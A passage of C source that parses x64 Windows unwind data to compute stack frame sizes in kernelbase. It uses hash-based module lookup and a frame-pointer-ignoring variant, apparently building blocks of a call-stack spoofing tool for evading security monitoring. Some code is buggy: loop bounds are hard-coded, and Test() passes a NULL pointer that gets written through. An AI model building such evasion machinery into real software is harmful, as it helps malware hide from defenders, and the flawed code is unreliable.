            // Save a nonvolatile integer register on the stack with a long offset, using a MOV instead of a PUSH. 
            // This code is primarily used for shrink-wrapping, where a nonvolatile register is saved to the stack 
            // in a position that was previously allocated. The operation info is the number of the register. 
            // The unscaled stack offset is recorded in the next two unwind operation code slots, as described 
            // in the note above.
            if (unwindCode->OpInfo == RSP) {
                return 0;
            }

            // For future use
            *((ULONG*)&ctx + unwindCode->OpInfo) = *targetStackOffset + (DWORD)((PUNWIND_CODE)((PWORD)unwindCode + 1))->FrameOffset;
            *((ULONG*)&ctx + unwindCode->OpInfo) += (DWORD)((PUNWIND_CODE)((PWORD)unwindCode + 2))->FrameOffset << 16;

            // We save the stack offset where MOV [RSP], RBP happened
            // During unwinding, this address will be popped back in RBP
            saveStackOffset = *((ULONG*)&ctx + unwindCode->OpInfo);
            // Restore Stack Size
            *targetStackOffset = backupStackOffset;

            // Skip the other two nodes used for this unwind operation
            unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 2);
            nodeIndex += 2;

            DPRINTCTX(ctx);
            break;

        case UWOP_EPILOG:            // 6
        case UWOP_SAVE_XMM128:       // 8
            // Save all 128 bits of a nonvolatile XMM register on the stack. The operation info is the number of 
            // the register. The scaled-by-16 stack offset is recorded in the next slot.

            // TODO: Handle this

            // Skip to next Unwind Code
            unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 1);
            nodeIndex++;
            break;
        case UWOP_SPARE_CODE:        // 7
        case UWOP_SAVE_XMM128BIG:    // 9
            // Save all 128 bits of a nonvolatile XMM register on the stack with a long offset. The operation info 
            // is the number of the register. The unscaled stack offset is recorded in the next two slots.

            // TODO: Handle this

            // Advancing next 2 nodes
            unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 2);
            nodeIndex += 2;
            break;
        case UWOP_PUSH_MACH_FRAME:    // 10
            // Push a machine frame. This unwind code is used to record the effect of a hardware interrupt or exception. 
            // There are two forms. 

            // NOTE: UNTESTED
            // TODO: Test this
            if (unwindCode->OpInfo == 0) {
                *targetStackOffset += 0x40;
            }
            else {
                *targetStackOffset += 0x48;
            }
            break;
        }

        unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 1);
        nodeIndex++;
    }

    // If chained unwind information is present then we need to
    // also recursively parse this and add to total stack size.
    if (BitChainInfo(unwindInfo->Flags))
    {
        nodeIndex = unwindInfo->CountOfCodes;
        if (0 != (nodeIndex & 1))
        {
            nodeIndex += 1;
        }
        pChainedFunction = (PRUNTIME_FUNCTION)(&unwindInfo->UnwindCode[nodeIndex]);
        return GetStackFrameSizeIgnoringUwopSetFpreg(moduleBase, (PUNWIND_INFO)((UINT64)moduleBase + (DWORD)pChainedFunction->UnwindData), targetStackOffset);
    }

    return *targetStackOffset;


}

DWORD GetStackFrameSize(HMODULE hModule, PVOID unwindInfoAddress, DWORD* targetStackOffset) {

    PRUNTIME_FUNCTION   pChainedFunction;

    DWORD               frameSize           = 0;
    DWORD               nodeIndex           = 0;
    BOOL                UWOP_SET_FPREG_HIT  = FALSE;
    PUNWIND_INFO        unwindInfo          = (PUNWIND_INFO)unwindInfoAddress;
    PUNWIND_CODE        unwindCode          = (PUNWIND_CODE)unwindInfo->UnwindCode;
    MIN_CTX             ctx                 = MIN_CTX();

    // Restore Stack Size
    *targetStackOffset                      = 0;

    // Initialise context
    custom_memset(&ctx, 0, sizeof(MIN_CTX));
    // printf("The stack is now 0x%I64X\n", *targetOffset);

    while(nodeIndex < unwindInfo->CountOfCodes){
        // Ensure frameSize is reset
        frameSize = 0;

        switch (unwindCode->UnwindOp) {
    
        case UWOP_PUSH_NONVOL: // 0
            
            if (unwindCode->OpInfo == RSP && !UWOP_SET_FPREG_HIT) {
                // We break here
                return 0;
            }
            *targetStackOffset += 8;
            break;

        case UWOP_ALLOC_LARGE: // 1
            // If the operation info equals 0 -> allocation size / 8 in next slot
            // If the operation info equals 1 -> unscaled allocation size in next 2 slots
            // In any case, we need to advance 1 slot and record the size

            // Skip to next Unwind Code
            unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 1);
            DPRINTUNWINDCODE(unwindCode);

            // Keep track of current node
            nodeIndex++;
            // Register size in next slot
            frameSize = unwindCode->FrameOffset;

            if (unwindCode->OpInfo == 0) {
                // If the operation info equals 0, then the size of the allocation divided by 8 
                // is recorded in the next slot, allowing an allocation up to 512K - 8.
                // We already advanced of 1 slot, and recorded the allocation size
                // We just need to multiply it for 8 to get the unscaled allocation size
                frameSize *= 8;
            }
            else 
            {
                // If the operation info equals 1, then the unscaled size of the allocation is 
                // recorded in the next two slots in little-endian format, allowing allocations 
                // up to 4GB - 8.
                // Skip to next Unwind Code
                unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 1);
                // Keep track of current node
                nodeIndex++;
                // Unmask the rest of the allocation size
                frameSize += unwindCode->FrameOffset << 16;

            }
            DPRINT("Final Frame Size: 0x%x\n", frameSize);
            *targetStackOffset += frameSize;
            break;

        case UWOP_ALLOC_SMALL: // 2

            // Allocate a small-sized area on the stack. The size of the allocation is the operation 
            // info field * 8 + 8, allowing allocations from 8 to 128 bytes.
            *targetStackOffset += 8 * (unwindCode->OpInfo + 1);
            break;


        case UWOP_SET_FPREG: // 3
            // Establish the frame pointer register by setting the register to some offset of the current RSP. 
            // The offset is equal to the Frame Register offset (scaled) field in the UNWIND_INFO * 16, allowing 
            // offsets from 0 to 240. The use of an offset permits establishing a frame pointer that points to the
            // middle of the fixed stack allocation, helping code density by allowing more accesses to use short 
            // instruction forms. The operation info field is reserved and shouldn't be used.

            if (BitEHandler(unwindInfo->Flags) && BitChainInfo(unwindInfo->Flags)) {
                return 0;
            }

            UWOP_SET_FPREG_HIT  = TRUE;

            frameSize           = -0x10 * (unwindInfo->FrameOffset);
            *targetStackOffset += frameSize;
            break;


        case UWOP_SAVE_NONVOL: // 4
            // Save a nonvolatile integer register on the stack using a MOV instead of a PUSH. This code is 
            // primarily used for shrink-wrapping, where a nonvolatile register is saved to the stack in a position 
            // that was previously allocated. The operation info is the number of the register. The scaled-by-8 
            // stack offset is recorded in the next unwind operation code slot, as described in the note above.
            if (unwindCode->OpInfo == RBP || unwindCode->OpInfo == RSP) {
                return 0;
            }
            // Skip to next Unwind Code
            unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 1);
            nodeIndex++;
                
            // For future use
            *((ULONG*)&ctx + unwindCode->OpInfo) = *targetStackOffset + (DWORD)((PUNWIND_CODE)((PWORD)unwindCode + 1))->FrameOffset * 8;
            DPRINTCTX(ctx);
                            
            break;
        case UWOP_SAVE_NONVOL_BIG: // 5
            // Save a nonvolatile integer register on the stack with a long offset, using a MOV instead of a PUSH. 
            // This code is primarily used for shrink-wrapping, where a nonvolatile register is saved to the stack 
            // in a position that was previously allocated. The operation info is the number of the register. 
            // The unscaled stack offset is recorded in the next two unwind operation code slots, as described 
            // in the note above.
            if (unwindCode->OpInfo == RBP || unwindCode->OpInfo == RSP) {
                return 0;
            }

            // For future use
            *((ULONG*)&ctx + unwindCode->OpInfo) = *targetStackOffset + (DWORD)((PUNWIND_CODE)((PWORD)unwindCode + 1))->FrameOffset;
            *((ULONG*)&ctx + unwindCode->OpInfo) += (DWORD)((PUNWIND_CODE)((PWORD)unwindCode + 2))->FrameOffset << 16;
            
            // Skip the other two nodes used for this unwind operation
            unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 2);
            nodeIndex += 2;

            DPRINTCTX(ctx);
            break;

        case UWOP_EPILOG:            // 6
        case UWOP_SAVE_XMM128:       // 8
            // Save all 128 bits of a nonvolatile XMM register on the stack. The operation info is the number of 
            // the register. The scaled-by-16 stack offset is recorded in the next slot.
            
            // TODO: Handle this
            
            // Skip to next Unwind Code
            unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 1);
            nodeIndex++;
            break;
        case UWOP_SPARE_CODE:        // 7
        case UWOP_SAVE_XMM128BIG:    // 9
            // Save all 128 bits of a nonvolatile XMM register on the stack with a long offset. The operation info 
            // is the number of the register. The unscaled stack offset is recorded in the next two slots.
            
            // TODO: Handle this
            
            // Advancing next 2 nodes
            unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 2);
            nodeIndex += 2;
            break;
        case UWOP_PUSH_MACH_FRAME:    // 10
            // Push a machine frame. This unwind code is used to record the effect of a hardware interrupt or exception. 
            // There are two forms.
            
            // NOTE: UNTESTED
            // TODO: Test this
            if (unwindCode->OpInfo == 0) {
                *targetStackOffset += 0x40;
            }
            else {
                *targetStackOffset += 0x48;
            }
            break;
        }
        
        unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 1);
        nodeIndex++;
    }

    // If chained unwind information is present then we need to
    // also recursively parse this and add to total stack size.
    if (BitChainInfo(unwindInfo->Flags))
    {
        nodeIndex = unwindInfo->CountOfCodes;
        if (0 != (nodeIndex & 1))
        {
            nodeIndex += 1;
        }
        pChainedFunction = (PRUNTIME_FUNCTION)(&unwindInfo->UnwindCode[nodeIndex]);        
        return GetStackFrameSize(hModule, (PUNWIND_INFO)((UINT64)hModule + (DWORD)pChainedFunction->UnwindData), targetStackOffset);
    }

    return UWOP_SET_FPREG_HIT;
    

}


/*********************************************************************************

    HELPER FUNCTIONS

*********************************************************************************/


void LookupSymbolFromRTIndex(HMODULE dllBase, int rtFuntionIndex, bool verbose) {


    PIMAGE_RUNTIME_FUNCTION_ENTRY rtFunction = RTFindFunctionByIndex((UINT64)dllBase, rtFuntionIndex);

    if (rtFunction == NULL) {
        printf("Function not found\n");
        return;
    }

    if (verbose) {
        printf("Function found:             \n");
        printf("  Begin Address 0x%x        \n", rtFunction->BeginAddress);
        printf("  End Address 0x%x          \n", rtFunction->EndAddress);
        printf("  Unwind Info Address 0x%x  \n", rtFunction->UnwindInfoAddress);
        printf("Looking up in exports...    \n");
    }
    char* procName = GetSymbolNameByOffset(dllBase, rtFunction->BeginAddress);

    if (procName == NULL) {
        if (verbose) {
            printf("Function not found\n");
        }
        return;
    }

    printf("Function %u found: %s\n", rtFuntionIndex, procName);

    if (verbose) {
        PrintUnwindInfo(dllBase, (PVOID)((UINT64)rtFunction->UnwindData));
    }

    return;
}

void PrintUnwindInfo(HMODULE dllBase, PVOID unwindDataAddress) {

    PUNWIND_INFO tInfo = (PUNWIND_INFO)((UINT64)dllBase + (DWORD)((UINT64)unwindDataAddress));

    printf("    Version: %d             \n", Version(tInfo->Flags));
    printf("    Ver + Flags: " B2BP "   \n", BYTE_TO_BINARY(tInfo->Flags));
    printf("    SizeOfProlog: 0x%x      \n", tInfo->SizeOfProlog);
    printf("    CountOfCodes: 0x%x      \n", tInfo->CountOfCodes);
    printf("    FrameRegister: 0x%x     \n", tInfo->FrameRegister);
    printf("    FrameOffset: 0x%x       \n", tInfo->FrameOffset);

    for (int j = 0; j < tInfo->CountOfCodes; j++) {
        printf("    UnwindCode [%d]     \n", j);
        printf("      Frame Offset: 0x%x\n", tInfo->UnwindCode[j].FrameOffset);
        printf("      Code Offset: 0x%x \n", tInfo->UnwindCode[j].CodeOffset);
        printf("      UnwindOp: 0x%x    \n", tInfo->UnwindCode[j].UnwindOp);
        printf("      UnwindOpInfo: 0x%x\n", tInfo->UnwindCode[j].OpInfo);
    }

    if (BitChainInfo(tInfo->Flags)) {
        printf("    Function Entry Offset: 0x%p\n", GetChainedFunctionEntry(dllBase, tInfo));
    }
    if (BitUHandler(tInfo->Flags)) {

    }
    if (BitEHandler(tInfo->Flags)) {
        PVOID dataPtr = GetExceptionDataPtr(tInfo);
        PVOID handlerPtr = GetExceptionHandler(dllBase, tInfo);
        ULONG data = *((PULONG)dataPtr);
        INT32 handler = *((PDWORD)handlerPtr);

        printf("    Exception Handler Offset: 0x%p\n", GetExceptionHandler(dllBase, tInfo));
        printf("    Exception Data Offset: 0x%x\n", data);
    }

    return;
}

void EnumAllRTFunctions(HMODULE moduleBase)
{
    DWORD                   tSize;
    PRUNTIME_FUNCTION       pRuntimeFunctionTable;

    pRuntimeFunctionTable = (PRUNTIME_FUNCTION)(GetExceptionDirectoryAddress(moduleBase, &tSize));

    for (DWORD i = 0; i <= 5038; i++)
    {
        /*
        PRUNTIME_FUNCTION rtft = (PRUNTIME_FUNCTION)(imageExportDirectory + 0xc*i);

        */

        printf("Runtime Function %u \n", i);
        printf("  Begin Address 0x%x\n  End Address 0x%x\n  Unwind Info Address 0x%x\n",
            pRuntimeFunctionTable[i].BeginAddress,
            pRuntimeFunctionTable[i].EndAddress,
            pRuntimeFunctionTable[i].UnwindInfoAddress);

        PrintUnwindInfo(moduleBase, (PVOID)((UINT64)pRuntimeFunctionTable[i].UnwindData));

    }
    // printf(BYTE_TO_BINARY_PATTERN"\n", BYTE_TO_BINARY(UBYTE(UNW_FLAG_CHAININFO | UNW_FLAG_UHANDLER|  UNW_FLAG_EHANDLER )));

}


PIMAGE_RUNTIME_FUNCTION_ENTRY RTFindFunctionByAddressInTable(PRUNTIME_FUNCTION pRuntimeFunctionTable, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, DWORD64 functionOffset) {

    for (DWORD i = 0; i < pImageExportDirectory->NumberOfFunctions; i++)
    {
        if (pRuntimeFunctionTable[i].BeginAddress == functionOffset) {

            return pRuntimeFunctionTable + i;
        }
    }
    return NULL;
}

PIMAGE_RUNTIME_FUNCTION_ENTRY RTFindFunctionByAddressInRFTable(PRUNTIME_FUNCTION pRuntimeFunctionTable, DWORD rtLastIndex, DWORD64 functionOffset) {

    for (DWORD i = 0; i < rtLastIndex; i++)
    {
        if (pRuntimeFunctionTable[i].BeginAddress == functionOffset) {

            return pRuntimeFunctionTable + i;
        }
    }
    return NULL;
}


PIMAGE_RUNTIME_FUNCTION_ENTRY RTFindFunctionByAddress(UINT64 modulelBase, DWORD64 functionOffset) {

    DWORD                   tSize;
    PRUNTIME_FUNCTION       pRuntimeFunctionTable;
    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory;

    pRuntimeFunctionTable = (PRUNTIME_FUNCTION)(GetExceptionDirectoryAddress((HMODULE)modulelBase, &tSize));
    pImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(GetExportDirectoryAddress((HMODULE)modulelBase));

    for (DWORD i = 0; i < pImageExportDirectory->NumberOfFunctions; i++)
    {
        if (pRuntimeFunctionTable[i].BeginAddress == functionOffset) {

            return pRuntimeFunctionTable + i;
        }
    }
    return NULL;
}

PIMAGE_RUNTIME_FUNCTION_ENTRY RTFindFunctionByIndex(UINT64 kernelBase, DWORD index) {

    DWORD                   tSize;
    PRUNTIME_FUNCTION       pRuntimeFunctionTable;
    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory;

    pRuntimeFunctionTable = (PRUNTIME_FUNCTION)(GetExceptionDirectoryAddress((HMODULE)kernelBase, &tSize));
    pImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(GetExportDirectoryAddress((HMODULE)kernelBase));

    return pRuntimeFunctionTable + index;
}

DWORD FindRTFunctionsUnwind(HMODULE moduleBase, PVOID tUnwindCodeAddress) {

    DWORD               tSize;
    PUNWIND_CODE        tUnwindCode;
    PUNWIND_INFO        unwindInfo;
    PRUNTIME_FUNCTION   pRuntimeFunctionTable;

    tUnwindCode = (PUNWIND_CODE)tUnwindCodeAddress;
    pRuntimeFunctionTable = (PRUNTIME_FUNCTION)(GetExceptionDirectoryAddress(moduleBase, &tSize));

    for (DWORD i = 0; i <= 5038; i++)
    {

        unwindInfo = (PUNWIND_INFO)((UINT64)moduleBase + (DWORD)pRuntimeFunctionTable[i].UnwindData);
        for (int j = 0; j < unwindInfo->CountOfCodes; j++) {

            if (unwindInfo->UnwindCode[j].FrameOffset == tUnwindCode->FrameOffset) {

                printf("Found frame offset with Runtime Function: %u, unwindCode: %u   \n", i + 1, j);
                printf("Found: 0x%x - Expected: 0x%x                                   \n", unwindInfo->UnwindCode[j].FrameOffset, tUnwindCode->FrameOffset);
                printf("Address in module: 0x%p                                        \n", (PVOID)((UINT64)moduleBase + (DWORD)pRuntimeFunctionTable[i].BeginAddress));

                return i;

            }

            // TODO: Implement the rest after

        }

    }
    printf("Function not found\n");

    return 0;

}

/*********************************************************************************

    TESTING FUNCTIONS

*********************************************************************************/


void TestLookupByFrameOffset() {
    UNWIND_CODE tUnwindCode;
    HMODULE     kernelBase;
    DWORD       offset;

    tUnwindCode.FrameOffset = 0x2313;
    kernelBase = (HMODULE)GetModule(KERNELBASE_HASH);
    offset = FindRTFunctionsUnwind(kernelBase, &tUnwindCode);

    LookupSymbolFromRTIndex(kernelBase, offset, TRUE);
}

void TestLocateFunctionByAddress() {
    PERF         rtFunction;
    HMODULE      kernelBase;
    UINT64       procOffset;
    PUNWIND_INFO tInfo;

    kernelBase = (HMODULE)GetModule(KERNELBASE_HASH);
    procOffset = GetSymbolOffset(kernelBase, "Internal_EnumSystemLocales");
    rtFunction = RTFindFunctionByAddress((UINT64)kernelBase, procOffset);

    printf("Function Offset: 0x%I64X\n", (ULONGLONG)procOffset);

    if (rtFunction == NULL) {
        printf("Function not found\n");
        return;
    }
    printf("Function found: \n");
    printf("  Begin Address 0x%08x\n  End Address 0x%08x\n  Unwind Info Address 0x%08x\n", rtFunction->BeginAddress, rtFunction->EndAddress, rtFunction->UnwindInfoAddress);

    tInfo = (PUNWIND_INFO)((UINT64)kernelBase + (DWORD)rtFunction->UnwindData);

    PrintUnwindInfo(kernelBase, (PVOID)((UINT64)rtFunction->UnwindData));
}

void TestEnumAllRT(DWORD moduleHash) {
    EnumAllRTFunctions((HMODULE)GetModule(moduleHash));
}

void Test()
{
    PERF         rtFunction;
    HMODULE      kernelBase;
    HMODULE      ntdllBase;
    HMODULE      mainModule;
    UINT64       procOffset;
    PUNWIND_INFO tInfo;
    UINT         errc;
    LPCSTR       tFunction;

    kernelBase = (HMODULE)GetModule(KERNELBASE_HASH);
    ntdllBase = (HMODULE)GetModule(NTDLL_HASH);
    mainModule = GetModuleHandle(NULL);
    errc = 0;
    tFunction = "UrlHashW";
    /*
    tFunction  = "SystemTimeToTzSpecificLocalTimeEx";
    tFunction  = "NtWriteVirtualMemory";
    tFunction  = "CreatePrivateObjectSecurity";
    */

    procOffset = GetSymbolOffset(kernelBase, tFunction);
    rtFunction = RTFindFunctionByAddress((UINT64)kernelBase, procOffset);
    if (rtFunction == NULL) {
        printf("Function not found\n");
        return;
    }

    printf("Function Offset: 0x%I64X\n", procOffset);
    printf("Function %s found: \n", tFunction);
    printf("  Begin Address 0x%08x\n  End Address 0x%08x\n  Unwind Info Address 0x%08x\n", rtFunction->BeginAddress, rtFunction->EndAddress, rtFunction->UnwindInfoAddress);

    tInfo = (PUNWIND_INFO)((UINT64)kernelBase + (DWORD)rtFunction->UnwindData);
    PrintUnwindInfo(kernelBase, (PVOID)((UINT64)rtFunction->UnwindData));
    GetStackFrameSize(kernelBase, tInfo, NULL);
    return;
}